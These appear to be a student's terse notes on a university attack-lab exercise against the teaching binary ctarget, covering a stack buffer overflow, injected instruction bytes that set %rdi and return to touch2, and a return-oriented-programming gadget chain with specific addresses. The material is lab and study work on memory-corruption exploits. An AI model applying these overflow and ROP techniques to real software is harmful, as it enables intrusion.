objdump to obtain dissambled version of ctarget.
To generate assembly code from the executable, execute `objdump -d ctarget > ctarget.s`.

gdb to step the execution through the last few steps.

touch1 address 4017c0
Modify buf through careful input to change the value of ret address to touch1.
buffer size 0x28, 40 bytes.
`./hex2raw < probehex.txt > proberaw`
`./ctarget -q < probraw`


0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3                      ret 

buffer head: rsp = 0x000000005561dc78
Let getbuf return to the beginning of the buf. Execute the code here.
Place the string at the beginning of the stack of the function test.
rsp = 0x5561dca8

jump to a location where it has the byte pattern resembling
```asm
movq $0x59b997fa,%rdi
pushq $0x4017ec
ret
```

find multiple places before c3 ret that executes the correct instructions.

```asm
00000000004019a0 <addval_273>:

4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax

4019a6: c3
```

move eax to edi. now try to find pop to eax

```asm
00000000004019ca <getval_280>:

4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax

4019cf: c3
```
pop to rax

First gadget 0x4019ca + 2 = 0x4019cc
After returned to this gadget, rsp should point to what I need in eax and edi
fa 97 b9 59
popq, so it should be a quad word
fa 97 b9 59 00 00 00 00
Now eax contains what I need in edi
Next gadget 0x4019a0 + 3 = 0x4019a3
Now edi has what I need
rsp should point to touch2 0x4017ec
go

be mindful of the order of the stack!!! it is top down!!!